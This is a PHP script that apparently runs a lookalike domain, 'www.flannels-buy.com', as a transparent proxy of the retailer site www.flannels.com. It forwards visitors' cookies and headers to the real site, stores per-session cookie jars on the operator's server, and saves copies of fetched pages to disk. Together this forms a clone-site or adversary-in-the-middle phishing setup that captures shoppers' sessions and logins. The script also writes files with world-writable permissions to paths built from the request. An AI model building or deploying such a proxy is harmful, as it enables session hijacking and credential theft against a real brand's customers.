<?php

define('ORIGIN_HOST', 'www.flannels.com');
define('OUR_HOST', 'www.flannels-buy.com');

ini_set('display_errors', 0);
error_reporting(E_ALL);

session_start();
$sessionId = session_id();

$folder = dirname($_SERVER['REQUEST_URI']);
$fileName = preg_replace('#\?.*$#siU', '', basename($_SERVER['REQUEST_URI']));

if (!file_exists($_SERVER['DOCUMENT_ROOT'] . $folder)) {
    mkdir($_SERVER['DOCUMENT_ROOT'] . $folder, 0777, true);
}

$ourHost = $_SERVER['HTTP_HOST'];
$destinationHostAddress = str_replace(OUR_HOST, ORIGIN_HOST, $_SERVER['HTTP_HOST']);

$responseProxyHeaders = [
    'accept-ranges', 'cache-control', 'content-transfer-encoding', 'content-type',
    'content-encoding', 'cookie', 'last-modified', 'location', 'pragma',
    'set-cookie', 'referer', 'origin', 'p3p', 'x-requested-with',
];

$requestProxyHeaders = [
    'host', 'accept-encoding', 'referer', 'origin', 'cookie',
    'pragma', 'cache-control', 'user-agent', 'x-requested-with',
];

$remoteIp = $_SERVER['REMOTE_ADDR'];
if ($_SERVER['SERVER_ADDR'] == $_SERVER['REMOTE_ADDR']) {
    $remoteIp = $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
}

list($protocolName, $protocolVersion) = explode('/', $_SERVER['SERVER_PROTOCOL']);

$destinationRequestHeaders = [];
foreach (getallheaders() as $name => $value) {
    if (!in_array(strtolower($name), $requestProxyHeaders)) {
        $destinationRequestHeaders[] = "$name: $value";
    }
}

$destinationServerNameHost = preg_match('#^\d{1,3}(\.\d{1,3}){3}$#', $destinationHostAddress) ? $_SERVER['HTTP_HOST'] : $destinationHostAddress;

$destinationRequestHeaders[] = "Host: {$destinationServerNameHost}";
if (isset($_SERVER['HTTP_COOKIE'])) {
    $destinationRequestHeaders[] = "Cookie: {$_SERVER['HTTP_COOKIE']}";
}
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $destinationRequestHeaders[] = "User-Agent: {$_SERVER['HTTP_USER_AGENT']}";
}
if (!empty($remoteIp)) {
    $destinationRequestHeaders[] = "X-Forwarded-For: {$remoteIp}";
}

$proxyRequestUrl = "https://{$destinationHostAddress}{$_SERVER['REQUEST_URI']}";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $proxyRequestUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $destinationRequestHeaders);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_COOKIEJAR, __DIR__ . "/cookies/cookie{$sessionId}.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, __DIR__ . "/cookies/cookie{$sessionId}.txt");
curl_setopt($ch, CURLOPT_STDERR, fopen('php://output', 'w'));

$results = curl_exec($ch);
curl_close($ch);

list($destinationResponseHeaders, $body) = explode("\r\n\r\n", $results, 2);
$destinationResponseHeaders = explode("\r\n", $destinationResponseHeaders);

$responseCode = '';
$responseMessage = '';
$sourceResponseHeaders = [];

foreach ($destinationResponseHeaders as $header) {
    if (!preg_match('/^([^:]+): (.*)$/', $header, $matches)) {
        list($protocol, $responseCode, $responseMessage) = explode(' ', $header, 3);
    } else {
        list($headerName, $headerValue) = array_splice($matches, -2);
        $sourceResponseHeaders[$headerName][] = $headerValue;
    }
}

header("{$_SERVER['SERVER_PROTOCOL']} {$responseCode} {$responseMessage}");
$sourceResponseHeaders = array_change_key_case($sourceResponseHeaders);

foreach ($responseProxyHeaders as $headerName) {
    if (isset($sourceResponseHeaders[$headerName])) {
        foreach ($sourceResponseHeaders[$headerName] as $headerValue) {
            header("{$headerName}: {$headerValue}", $headerName == 'set-cookie' ? false : true);
        }
    }
}

file_put_contents($_SERVER['DOCUMENT_ROOT'] . $folder . '/' . $fileName, $body);
die($body);
